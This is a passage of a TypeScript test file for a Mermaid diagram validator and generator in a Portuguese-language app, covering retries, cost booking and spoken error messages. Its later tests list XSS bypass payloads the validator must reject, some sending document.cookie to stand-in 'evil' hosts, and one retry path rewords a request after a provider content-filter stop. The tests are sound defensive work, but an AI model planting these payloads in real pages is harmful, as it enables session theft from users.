import { describe, it, expect, afterAll, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { randomUUID } from "node:crypto";
import type { MermaidCompletion, MermaidOptions } from "../services/mermaid.js";

// The generator books cost, which reaches storage, which imports sandbox.ts —
// and that freezes homedir()-derived roots at module load. HOME first, import
// after, same as storage.test.ts.
const tmpHome = mkdtempSync(join(tmpdir(), "explainer-mermaid-"));
process.env.HOME = tmpHome;

const mermaid = await import("../services/mermaid.js");
const costs = await import("../services/costs.js");

afterAll(() => {
  rmSync(tmpHome, { recursive: true, force: true });
});

const VALID: Record<string, string> = {
  flowchart: `flowchart TD
    A["Navegador"] --> B["Backend"]
    B --> C["Modelo de voz"]`,
  sequenceDiagram: `sequenceDiagram
    participant N as Navegador
    participant B as Backend
    N->>B: chamada de ferramenta
    B-->>N: resultado`,
  classDiagram: `classDiagram
    class Conversa {
        +String id
        +iniciar()
    }
    Conversa --> Material`,
  "stateDiagram-v2": `stateDiagram-v2
    [*] --> Ocioso
    Ocioso --> Ouvindo
    Ouvindo --> [*]`,
  erDiagram: `erDiagram
    CONVERSA ||--o{ MENSAGEM : contem
    CONVERSA {
        string id
        string titulo
    }`,
  journey: `journey
    title Jornada do usuario
    section Comeco
      Abrir o app: 5: Usuario`,
  gantt: `gantt
    title Cronograma
    dateFormat YYYY-MM-DD
    section Onda 1
    Gerador de mermaid :a1, 2026-08-08, 3d`,
  pie: `pie title Distribuicao
    "Backend" : 60
    "Navegador" : 40`,
  mindmap: `mindmap
  root((Explainer))
    Backend
      Ferramentas
    Navegador`,
  timeline: `timeline
    title Historia do projeto
    2026 : Primeira versao
    2027 : Realtime`,
};

const SIMPLE = VALID.flowchart!;

function reply(text: string): MermaidCompletion {
  return { text };
}

/** A stub that answers each attempt in turn, and records the prompts it saw. */
function scripted(answers: string[]): MermaidOptions & { prompts: string[] } {
  const prompts: string[] = [];
  let index = 0;
  return {
    prompts,
    complete: async (prompt: string) => {
      prompts.push(prompt);
      const answer = answers[Math.min(index, answers.length - 1)] ?? "";
      index += 1;
      return reply(answer);
    },
  };
}

describe("validateMermaid", () => {
  for (const [kind, source] of Object.entries(VALID)) {
    it(`accepts a valid ${kind}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.problems).toEqual([]);
      expect(result.ok).toBe(true);
      expect(result.kind).toBe(kind);
    });
  }

  it("rejects an empty string", () => {
    const result = mermaid.validateMermaid("");
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/vazio/);
  });

  it("rejects code fences", () => {
    const fenced = "```mermaid\nflowchart TD\n    A --> B\n```";
    const result = mermaid.validateMermaid(fenced);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/cercas de codigo/);
  });

  it("rejects prose before the diagram", () => {
    const result = mermaid.validateMermaid(
      `Claro! Aqui esta o diagrama que voce pediu:\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/primeira linha util/);
  });

  it("rejects an invented diagram type", () => {
    for (const invented of ["graphviz", "flowchartt"]) {
      const result = mermaid.validateMermaid(`${invented} TD\n    A --> B`);
      expect(result.ok).toBe(false);
      expect(result.kind).toBeUndefined();
      expect(result.problems.join(" ")).toMatch(/primeira linha util/);
    }
  });

  it("names the fix for the two near-misses mermaid does accept", () => {
    expect(mermaid.validateMermaid("graph TD\n    A --> B").problems.join(" ")).toMatch(
      /"graph" por "flowchart"/,
    );
    expect(
      mermaid.validateMermaid("stateDiagram\n    [*] --> A").problems.join(" "),
    ).toMatch(/"stateDiagram-v2"/);
  });

  it("rejects unbalanced brackets", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A[Navegador --> B[Backend]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/Faltou fechar/);
  });

  it("reports a closer that was never opened", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A --> B]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/nunca foi aberto/);
  });

  it("rejects unbalanced quotes", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["Navegador] --> B["Backend"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/aspa dupla/);
  });

  it("rejects a script tag", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<script>alert(1)</script>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/tag HTML/);
  });

  it("rejects a javascript: URL", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["ok"] --> B["javascript:alert(1)"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/javascript:/);
  });

  it("rejects an href attribute", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<a href='x'>oi</a>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/href/);
  });

  it("rejects an onerror attribute", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<img src=x onerror=alert(1)>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/atributo de evento/);
  });

  it("rejects a click ... call directive", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["ok"] --> B["fim"]
    click A call foo()`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/click/);
  });

  it("rejects an init directive that touches securityLevel", () => {
    const result = mermaid.validateMermaid(
      `%%{init: {"securityLevel":"loose"}}%%\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/securityLevel/);
  });

  it("rejects an init directive that touches htmlLabels", () => {
    const result = mermaid.validateMermaid(
      `%%{init: {"flowchart":{"htmlLabels":"false"}}}%%\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/htmlLabels/);
  });

  it("keeps an ordinary comment line", () => {
    const result = mermaid.validateMermaid(`%% desenho da chamada de ferramenta\n${SIMPLE}`);
    expect(result.ok).toBe(true);
    expect(result.kind).toBe("flowchart");
  });

  it("rejects a diagram with too many lines", () => {
    const huge = ["flowchart TD", ...Array.from({ length: 300 }, (_, i) => `    A${i} --> B${i}`)].join("\n");
    const result = mermaid.validateMermaid(huge);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/linhas e o limite/);
  });

  it("rejects a diagram with too many characters", () => {
    const result = mermaid.validateMermaid(`flowchart TD\n    A["${"x".repeat(9_000)}"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/caracteres e o limite/);
  });
});

describe("stripFences", () => {
  it("removes the fence lines and leaves the diagram", () => {
    const cleaned = mermaid.stripFences("```mermaid\nflowchart TD\n    A --> B\n```");
    expect(cleaned).toBe("flowchart TD\n    A --> B");
  });
});

describe("generateMermaid", () => {
  const request = {
    instructions: "desenha o fluxo de uma chamada de ferramenta, do navegador ao backend",
  };

  it("returns a validated diagram with a spoken caption, an id and a timestamp", async () => {
    const stub = scripted([`LEGENDA: Esse desenho mostra a ida e a volta de uma chamada de ferramenta.\nDIAGRAMA:\n${SIMPLE}`]);
    const diagram = await mermaid.generateMermaid(
      { ...request, title: "Chamada de ferramenta" },
      randomUUID(),
      stub,
    );

    expect(diagram.kind).toBe("flowchart");
    expect(diagram.source).toBe(SIMPLE);
    expect(diagram.title).toBe("Chamada de ferramenta");
    expect(diagram.caption).toBe(
      "Esse desenho mostra a ida e a volta de uma chamada de ferramenta.",
    );
    expect(diagram.id).toMatch(/^[0-9a-f-]{36}$/);
    expect(Number.isNaN(Date.parse(diagram.created_at))).toBe(false);
    expect(stub.prompts).toHaveLength(1);
  });

  it("cleans fences and a prefaced sentence without spending a retry", async () => {
    const stub = scripted([
      `Claro, segue o diagrama.\nLEGENDA: Mostra o caminho da chamada.\nDIAGRAMA:\n\`\`\`mermaid\n${SIMPLE}\n\`\`\``,
    ]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.source).toBe(SIMPLE);
    expect(stub.prompts).toHaveLength(1);
  });

  it("falls back to a spoken caption when the model omits one", async () => {
    const stub = scripted([SIMPLE]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.caption).toMatch(/fluxograma/);
    expect(diagram.caption).not.toMatch(/[`*_#]/);
  });

  it("retries with the problems and succeeds on the third attempt", async () => {
    const stub = scripted([
      "Aqui esta o diagrama:\nflowchartt TD\n    A --> B",
      `LEGENDA: quase\nDIAGRAMA:\nflowchart TD\n    A[Navegador --> B[Backend]`,
      `LEGENDA: Do navegador ao backend e de volta.\nDIAGRAMA:\n${SIMPLE}`,
    ]);

    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.source).toBe(SIMPLE);
    expect(stub.prompts).toHaveLength(3);
    // Each correction carries the previous failure back to the model.
    expect(stub.prompts[1]).toMatch(/primeira linha util/);
    expect(stub.prompts[2]).toMatch(/Faltou fechar/);
    expect(stub.prompts[2]).toMatch(/Diagrama recusado/);
  });

  it("gives up after three attempts with a message the voice model can read", async () => {
    const stub = scripted(["nao sei desenhar isso, desculpa"]);

    await expect(mermaid.generateMermaid(request, randomUUID(), stub)).rejects.toThrow(
      /Tentei 3 vezes/,
    );
    expect(stub.prompts).toHaveLength(3);

    const failure = await mermaid
      .generateMermaid(request, randomUUID(), scripted(["nao sei desenhar isso"]))
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    expect((failure as InstanceType<typeof mermaid.MermaidError>).problems.length).toBeGreaterThan(0);
  });

  it("refuses empty instructions without calling the model", async () => {
    const stub = scripted([SIMPLE]);
    await expect(
      mermaid.generateMermaid({ instructions: "   " }, randomUUID(), stub),
    ).rejects.toBeInstanceOf(mermaid.MermaidError);
    expect(stub.prompts).toHaveLength(0);
  });

  it("books one ledger entry per attempt, including the failed ones", async () => {
    const conversationId = randomUUID();
    let attempt = 0;
    const answers = ["flowchartt TD\n    A --> B", SIMPLE];

    await mermaid.generateMermaid(request, conversationId, {
      complete: async () => {
        const text = answers[Math.min(attempt, answers.length - 1)]!;
        attempt += 1;
        return {
          text,
          usage: { input_tokens: 1_000, output_tokens: 200 },
          model: "gpt-5.2-mini",
        };
      },
    });

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(2);
    // Its own ledger source, so a diagram is never mistaken for a text call.
    expect(summary.entries.every((entry) => entry.source === "mermaid")).toBe(true);
    expect(summary.by_source.text).toBe(0);
    // 1000 input @ 0.35/1M + 200 output @ 2.8/1M, twice.
    expect(summary.by_source.mermaid).toBeCloseTo(0.00091 * 2, 8);
    expect(summary.entries[0]?.detail).toMatch(/mermaid/);
  });

  // Expectation changed after the adversarial review: booking nothing is still
  // the contract for an injected client, but the review's point stands — a
  // silent zero is this ledger's documented failure mode, so the call now says
  // out loud that it was not charged instead of leaving the panel to imply free.
  it("books nothing but warns when the caller's client reports no usage", async () => {
    const conversationId = randomUUID();
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    await mermaid.generateMermaid(request, conversationId, scripted([SIMPLE]));

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toEqual([]);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toMatch(/not billed/);
    warn.mockRestore();
  });

  it("warns when the model id is not on the rate card, without failing", async () => {
    const conversationId = randomUUID();
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    const diagram = await mermaid.generateMermaid(request, conversationId, {
      complete: async () => ({
        text: SIMPLE,
        usage: { input_tokens: 1_000, output_tokens: 200 },
        model: "gpt-5.3-mini",
      }),
    });

    expect(diagram.kind).toBe("flowchart");
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toMatch(/gpt-5\.3-mini.*rate card/);
    // The entry is still written, at the only price the rate card can name.
    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(1);
    expect(summary.by_source.mermaid).toBe(0);
    warn.mockRestore();
  });

  it("spends only the attempts the caller allows", async () => {
    const stub = scripted(["nao sei desenhar isso, desculpa"]);

    await expect(
      mermaid.generateMermaid(request, randomUUID(), { ...stub, attempts: 2 }),
    ).rejects.toThrow(/Tentei 2 vezes/);
    expect(stub.prompts).toHaveLength(2);
  });

  it("stops between attempts once the caller aborts", async () => {
    const controller = new AbortController();
    let calls = 0;

    const failure = await mermaid
      .generateMermaid(request, randomUUID(), {
        signal: controller.signal,
        complete: async () => {
          calls += 1;
          controller.abort();
          return { text: "nao sei desenhar isso" };
        },
      })
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    expect((failure as InstanceType<typeof mermaid.MermaidError>).message).toMatch(
      /interrompida/,
    );
    // The second attempt never happens, which is the whole point of the signal.
    expect(calls).toBe(1);
  });
});

// A reasoning model shares `max_output_tokens` with its thinking, so a diagram
// it thought hard about comes back cut in half — with a 200, no error, and
// bracket errors the model never made. Corrected as a syntax problem it answers
// with the same too-long diagram and burns the whole budget.
describe("generateMermaid tells a truncated answer apart from a wrong one", () => {
  const request = { instructions: "desenha a arquitetura inteira do sistema" };

  it("asks for a smaller drawing instead of correcting syntax", async () => {
    const prompts: string[] = [];
    let call = 0;

    const diagram = await mermaid.generateMermaid(request, randomUUID(), {
      complete: async (prompt: string) => {
        prompts.push(prompt);
        call += 1;
        return call === 1
          ? { text: 'flowchart TD\n    A["Inicio"] --> B["Meio"] --> C["', truncated: true }
          : { text: `LEGENDA: Versao curta do desenho.\nDIAGRAMA:\n${SIMPLE}` };
      },
    });

    expect(diagram.source).toBe(SIMPLE);
    expect(prompts).toHaveLength(2);
    expect(prompts[1]).toMatch(/CORTADA no meio/);
    // The fragment is never handed back as a diagram to repair.
    expect(prompts[1]).not.toMatch(/Diagrama recusado/);
    expect(prompts[1]).not.toMatch(/Faltou fechar/);
  });

  it("gives up with its own message, not the invalid-syntax one", async () => {
    const conversationId = randomUUID();
    const failure = await mermaid
      .generateMermaid(request, conversationId, {
        attempts: 2,
        complete: async () => ({
          text: 'flowchart TD\n    A["Inicio',
          truncated: true,
          usage: { input_tokens: 1_000, output_tokens: 200 },
          model: "gpt-5.2-mini",
        }),
      })
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    const message = (failure as InstanceType<typeof mermaid.MermaidError>).message;
    expect(message).toMatch(/cortado no meio/);
    expect(message).not.toMatch(/continuou invalido/);

    // Cut short or not, the provider answered twice and charged for both.
    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(2);
    expect(summary.by_source.mermaid).toBeCloseTo(0.00091 * 2, 8);
  });
});

// `status: "incomplete"` is not one condition. `max_output_tokens` means the
// drawing was too big and the fix is to draw less; `content_filter` means the
// provider stopped for its own reasons and the size was never the complaint.
// Answering the second like the first tells the user their diagram was too big
// and spends the retry shrinking something that did not need shrinking.
describe("generateMermaid tells the token budget apart from any other early stop", () => {
  const request = { instructions: "desenha o fluxo de uma chamada de ferramenta" };

  it("asks for different wording, not a smaller drawing, when the provider stops", async () => {
    const prompts: string[] = [];
    let call = 0;

    const diagram = await mermaid.generateMermaid(request, randomUUID(), {
      complete: async (prompt: string) => {
        prompts.push(prompt);
        call += 1;
        return call === 1
          ? { text: "flowchart TD\n    A[", stoppedEarly: "content_filter" }
          : { text: `LEGENDA: Outra redacao do mesmo desenho.\nDIAGRAMA:\n${SIMPLE}` };
      },
    });

    expect(diagram.source).toBe(SIMPLE);
    expect(prompts[1]).toMatch(/interrompida pelo provedor/);
    expect(prompts[1]).toMatch(/content_filter/);
    // Neither of the other two corrections: nothing was too big and nothing
    // about the fragment's syntax is evidence of anything.
    expect(prompts[1]).not.toMatch(/CORTADA no meio/);
    expect(prompts[1]).not.toMatch(/Diagrama recusado/);
  });

  it("gives up with a message that does not blame the size", async () => {
    const failure = await mermaid
      .generateMermaid(request, randomUUID(), {
        attempts: 2,
        complete: async () => ({ text: "flowchart TD\n    A[", stoppedEarly: "content_filter" }),
      })
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    const error = failure as InstanceType<typeof mermaid.MermaidError>;
    expect(error.message).toMatch(/parou antes do fim/);
    expect(error.message).not.toMatch(/grande demais/);
    expect(error.message).not.toMatch(/continuou invalido/);
    // The reason is not lost, it is just not the sentence the user hears.
    expect(error.problems.join(" ")).toMatch(/content_filter/);
  });

  // The mapping itself, at the only place it happens: a 200 whose body says
  // `incomplete`. The old code read every reason as the token budget.
  describe("reading `incomplete_details.reason` off the Responses payload", () => {
    const originalFetch = globalThis.fetch;
    const originalKey = process.env.OPENAI_API_KEY;

    afterEach(() => {
      globalThis.fetch = originalFetch;
      if (originalKey === undefined) delete process.env.OPENAI_API_KEY;
      else process.env.OPENAI_API_KEY = originalKey;
    });

    /** One canned Responses body, never a socket. */
    function answerWith(reason: string | undefined): void {
      process.env.OPENAI_API_KEY = "sk-test-not-a-real-key";
      globalThis.fetch = (async () =>
        new Response(
          JSON.stringify({
            model: "gpt-5.2-mini",
            status: "incomplete",
            ...(reason === undefined ? {} : { incomplete_details: { reason } }),
            usage: { input_tokens: 10, output_tokens: 1 },
            output: [{ type: "message", content: [{ text: "flowchart TD\n    A[" }] }],
          }),
          { status: 200, headers: { "Content-Type": "application/json" } },
        )) as typeof globalThis.fetch;
    }

    it("treats max_output_tokens as the drawing being too big", async () => {
      answerWith("max_output_tokens");

      const failure = await mermaid
        .generateMermaid(request, randomUUID(), { attempts: 1 })
        .catch((err: unknown) => err);

      expect((failure as Error).message).toMatch(/grande demais/);
    });

    it("does not treat content_filter as the drawing being too big", async () => {
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
      answerWith("content_filter");

      const failure = await mermaid
        .generateMermaid(request, randomUUID(), { attempts: 1 })
        .catch((err: unknown) => err);

      expect((failure as Error).message).toMatch(/parou antes do fim/);
      expect((failure as Error).message).not.toMatch(/grande demais/);
      expect(warn.mock.calls.flat().join(" ")).toMatch(/stopped early: content_filter/);
      warn.mockRestore();
    });

    // An `incomplete` with no reason at all is the budget in every case the API
    // documents, so it keeps the correction it always had.
    it("reads a missing reason as the token budget", async () => {
      answerWith(undefined);

      const failure = await mermaid
        .generateMermaid(request, randomUUID(), { attempts: 1 })
        .catch((err: unknown) => err);

      expect((failure as Error).message).toMatch(/grande demais/);
    });
  });
});

// The ledger's rule, from `tracking-costs-and-credits`: a call the provider
// served has to show up, and a zero is worse than an estimate because nothing
// says it is wrong. The 25 s ceiling in the tool layer aborts a request that
// was read and was already generating, and both halves are charged.
describe("generateMermaid bills the attempt the ceiling cut off", () => {
  const request = { instructions: "desenha a arquitetura inteira do sistema" };

  it("books an estimate instead of nothing when the caller aborts mid-call", async () => {
    const conversationId = randomUUID();
    const controller = new AbortController();
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    const failure = await mermaid
      .generateMermaid(request, conversationId, {
        signal: controller.signal,
        complete: async (_prompt: string, signal?: AbortSignal) => {
          controller.abort();
          const error = new Error("The operation was aborted");
          error.name = "AbortError";
          void signal;
          throw error;
        },
      })
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    expect((failure as Error).message).toMatch(/interrompida/);

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(1);
    expect(summary.entries[0]?.detail).toMatch(/interrompida: estimativa/);
    // Priced from the prompt we know we sent — an under-estimate, never a zero.
    expect(summary.by_source.mermaid).toBeGreaterThan(0);
    expect(summary.entries[0]?.tokens?.input).toBeGreaterThan(0);
    expect(summary.entries[0]?.tokens?.output).toBe(0);
    expect(warn.mock.calls.flat().join(" ")).toMatch(/abandoned in flight/);
    warn.mockRestore();
  });

  // A failure that never reached the provider is not a served call, and booking
  // it would put money in the ledger for a request nobody answered.
  it("books nothing when the call never left the process", async () => {
    const conversationId = randomUUID();

    await expect(
      mermaid.generateMermaid(request, conversationId, {
        complete: async () => {
          throw new TypeError("fetch is not a function");
        },
      }),
    ).rejects.toThrow(/fetch is not a function/);

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toEqual([]);
  });
});

// `problems` is the validator talking to itself — bracket counts, node ids and
// sixty verbatim characters of the source it refused — and this message is read
// out loud, verbatim, by `deliberation-tools.ts`. Interpolating one into the
// other spoke `Veio "grafico TD A["Navegador"] --> B["Backend"]"` at a listener:
// the very thing the caption filter above exists to prevent, one layer up.
describe("the exhaustion message is spoken, and the diagnosis is not", () => {
  const request = { instructions: "desenha o fluxo de uma chamada de ferramenta" };

  // The same rule `cleanCaption` applies, so the two boundaries cannot drift.
  const CAPTION_SYNTAX = /[[\]{}|<>`]|%%|-{1,2}\)|\(\(|\)\)|[A-Za-z0-9_]\(|::/;

  const refused: Record<string, string> = {
    "an undeclared type, with the source echoed back":
      'grafico TD A["Navegador"] --> B["Backend do Explainer"] --> C["Modelo de voz"]',
    "unbalanced brackets, which name the symbols":
      'flowchart TD\n    A["Navegador" --> B{"Decide"\n    B --> C',
    'the "graph" spelling, which names two keywords':
      'graph TD\n    A["Navegador"] --> B["Backend"]',
  };

  for (const [name, answer] of Object.entries(refused)) {
    it(`says nothing a listener cannot hear when the model sends ${name}`, async () => {
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

      const failure = await mermaid
        .generateMermaid(request, randomUUID(), {
          attempts: 2,
          complete: async () => ({ text: `LEGENDA: ok\nDIAGRAMA:\n${answer}` }),
        })
        .catch((err: unknown) => err);

      const error = failure as InstanceType<typeof mermaid.MermaidError>;
      expect(error).toBeInstanceOf(mermaid.MermaidError);
      expect(error.message).not.toMatch(CAPTION_SYNTAX);
      expect(error.message).toMatch(/Tentei 2 vezes/);

      // Nothing is lost: the diagnosis is on the error and in the log, which is
      // what the retry loop and a human reading stderr actually need.
      expect(error.problems.length).toBeGreaterThan(0);
      expect(error.lastSource).toBe(answer.trim());
      expect(warn.mock.calls.flat().join(" ")).toMatch(/gave up after 2 attempt/);
      warn.mockRestore();
    });
  }

  // The other two exhaustion messages were already spoken; they are asserted
  // here so the three cannot drift apart.
  it("keeps the truncation and early-stop messages speakable too", async () => {
    for (const [completion, expected] of [
      [{ text: "flowchart TD\n    A[", truncated: true }, /grande demais/],
      [{ text: "flowchart TD\n    A[", stoppedEarly: "content_filter" }, /parou antes do fim/],
    ] as const) {
      const failure = await mermaid
        .generateMermaid(request, randomUUID(), {
          attempts: 1,
          complete: async () => completion,
        })
        .catch((err: unknown) => err);

      expect((failure as Error).message).toMatch(expected);
      expect((failure as Error).message).not.toMatch(CAPTION_SYNTAX);
    }
  });
});

// A false rejection is not a harmless strictness: it burns a retry the user pays
// for and can fail an otherwise good diagram three times. These are the shapes
// whose syntax is legitimately "unbalanced" and would break a naive scan.
describe("validateMermaid does not reject legitimate syntax", () => {
  const realistic: Record<string, string> = {
    // The four the adversarial review measured as false rejections, plus the
    // three the fix for them had to keep working.
    "sequence with the async message arrows -) and --)": `sequenceDiagram
    participant N as Navegador
    participant B as Backend
    N-)B: mensagem assincrona
    B--)N: resposta assincrona
    N->>B: chamada normal`,
    "yaml frontmatter before the type": `---
title: Fluxo da chamada de ferramenta
---
flowchart TD
    A["Navegador"] --> B["Backend"]`,
    "the asymmetric flowchart node A>\"texto\"]": `flowchart TD
    A>"Aviso"] --> B["Fim"]`,
    "a label that merely names securityLevel": `flowchart TD
    A["securityLevel strict"] --> B["htmlLabels desligado"]`,
    "a mindmap node whose text starts with click": `mindmap
  root((Interface))
    click do usuario
    resposta falada`,
    "a gantt task whose text starts with click": `gantt
    title Cronograma
    dateFormat YYYY-MM-DD
    section Uso
    click do usuario :a1, 2026-08-08, 3d`,
    "statements separated by semicolons": `flowchart TD;
    A["Inicio"] --> B["Fim"];
    B --> C["Depois"];`,
    "flowchart with subgraphs and edge labels": `flowchart LR
    subgraph Navegador
      U["Usuario fala"] --> S["Sessao WebRTC"]
    end
    subgraph Servidor
      T["Executor de ferramentas"] --> R[("Repositorio")]
    end
    S -->|chamada de ferramenta| T
    T -->|resultado| S`,
    "sequence with alt, else and a note": `sequenceDiagram
    autonumber
    participant N as Navegador
    participant B as Backend
    N->>B: POST /api/tool
    alt material existe
        B-->>N: trecho do arquivo
    else nao existe
        B-->>N: aviso
    end
    Note over N,B: tudo passa pelo sandbox`,
    "er cardinality symbols that invert braces": `erDiagram
    CONVERSA ||--o{ MENSAGEM : contem
    CONVERSA }o--|| USUARIO : pertence
    MATERIAL }|..|{ CONVERSA : usado`,
    "class diagram with a stereotype and a method": `classDiagram
    class Ferramenta {
        <<interface>>
        +String nome
        +executar(args) String
    }
    Ferramenta <|-- LeitorDeArquivo`,
    "composite state": `stateDiagram-v2
    [*] --> Ocioso
    state Chamada {
        Ouvindo --> Pensando
        Pensando --> Falando
    }
    Ocioso --> Chamada
    Chamada --> [*]`,
    "mindmap cloud and bang shapes": `mindmap
  root((Explainer))
    Backend
      )Ferramentas(
      ((Custos))
    Navegador`,
    "a percent sign inside a label": `flowchart TD
    A["Cobertura de 50% dos casos"] --> B["Fim"]`,
    // `<` only opens a tag when a letter follows it immediately, so a spaced
    // comparison is arithmetic. The old check read it as markup and burned a
    // paid retry on a diagram that was already right.
    "a mathematical comparison in a label": `flowchart TD
    A["tempo < 5 segundos"] --> B["tempo >= 5 segundos"]`,
    "a comparison against a name, still spaced": `flowchart TD
    A["custo < receita"] --> B["ok"]`,
    "a less-than glued to a digit": `flowchart TD
    A["latencia <5ms"] --> B["ok"]`,
  };

  for (const [name, source] of Object.entries(realistic)) {
    it(`accepts ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.problems).toEqual([]);
      expect(result.ok).toBe(true);
    });
  }

  it("accepts every legitimate diagram in the corpus, all 27 of them", () => {
    const corpus = { ...VALID, ...realistic };
    const rejected = Object.entries(corpus)
      .filter(([, source]) => !mermaid.validateMermaid(source).ok)
      .map(([name]) => name);

    expect(Object.keys(corpus).length).toBeGreaterThanOrEqual(27);
    expect(rejected).toEqual([]);
  });

  // The other side of the same boundary. `<` is only text when what follows it
  // cannot open a tag; relaxing it any further than that is a hole.
  it("still rejects a `<` glued to a letter, which is a tag", () => {
    for (const source of [
      'flowchart TD\n    A["x <y"] --> B',
      'flowchart TD\n    A["</b>"] --> B',
      'flowchart TD\n    A["<b>oi</b>"] --> B',
      // Whitespace the browser itself removes from an attribute value is folded
      // away first, so hiding the letter behind a tab does not help.
      'flowchart TD\n    A["<\tscript>alert(1)</script>"] --> B',
    ]) {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.join(" ")).toMatch(/tag HTML/);
    }
  });

  // Where the line is drawn, written down so moving it is a decision.
  //
  // The HTML tokenizer's tag-open state accepts only `!`, `/`, `?` or an ASCII
  // letter after `<`; anything else emits a literal `<` and goes back to reading
  // text. So `< script>` never becomes an element in any parser mermaid or
  // DOMPurify runs on — it renders as the five visible characters. Matching that
  // rule exactly is what keeps `A["custo < receita"]` from costing a retry, and
  // a payload that needs more than an inert `<` still trips one of the checks
  // that do not care about tags at all.
  it("accepts a `<` that cannot open a tag, and still catches the payload behind it", () => {
    expect(mermaid.validateMermaid('flowchart TD\n    A["< script>"] --> B').ok).toBe(true);
    expect(mermaid.validateMermaid('flowchart TD\n    A["<5script>"] --> B').ok).toBe(true);

    for (const [source, expected] of [
      ['flowchart TD\n    A["< img src=x onerror=alert(1)>"] --> B', /atributo de evento/],
      ['flowchart TD\n    A["< a href=javascript:alert(1)>"] --> B', /javascript:/],
      ['flowchart TD\n    A["< a href=\'x\'>oi"] --> B', /href/],
    ] as const) {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.join(" ")).toMatch(expected);
    }
  });
});

// The first version of these checks was a denylist of literal spellings, and an
// adversarial review ran 51 hostile diagrams through it: 27 came back ok: true.
// These are the eight chains it verified by hand, plus every variant it listed.
// Each one reaches the renderer as the construct the denylist was looking for —
// it just is not spelled that way in the source. Nothing here may ever be ok.
describe("validateMermaid rejects the bypasses the adversarial review found", () => {
  const attacks: Record<string, string> = {
    'A: classDiagram "link" with an entity-escaped javascript URL': `classDiagram
class Conversa
link Conversa "&#106;avascript:fetch('//evil/'+document.cookie)" "abrir"`,
    "B: classDiagram callback, the interaction directive nobody checked": `classDiagram
class Conversa
callback Conversa "roubaTudo" "dica"`,
    "C: click call hidden behind a semicolon on the same line": `flowchart TD
A["Inicio"] --> B["Fim"]; click B call roubaTudo()`,
    "D: click href, which never carries the = the old check demanded": `flowchart TD
A["Inicio"] --> B["Fim"]; click B href "https://evil.example" _blank`,
    "E: an img tag with onpointerover, neither of them on the old lists": `flowchart TD
A["<img src=x onpointerover=fetch('//evil/'+document.cookie)>"] --> B`,
    "E2: onauxclick": `flowchart TD
A["<b onauxclick=alert(1)>oi</b>"] --> B`,
    "E3: onanimationend": `flowchart TD
A["<b onanimationend=alert(1)>oi</b>"] --> B`,
    "E4: a video tag with onplay": `flowchart TD
A["<video src=x onplay=alert(1)>"] --> B`,
    "E5: an anchor with target=_blank": `flowchart TD
A["<a target=_blank>oi</a>"] --> B`,
    "F1: a script tag written as HTML entities": `flowchart TD
A["&lt;script&gt;alert(1)&lt;/script&gt;"] --> B`,
    "F2: a script tag written in mermaid's own #NNN; escapes": `flowchart TD
A["#60;script#62;alert(1)#60;/script#62;"] --> B`,
    "F3: an img/onerror rebuilt from #60; and #111;": `flowchart TD
A["#60;img src=x #111;nerror=alert(1)#62;"] --> B`,
    "G1: javascript: split across a line break inside the label": `flowchart TD
A["java
script:alert(1)"] --> B`,
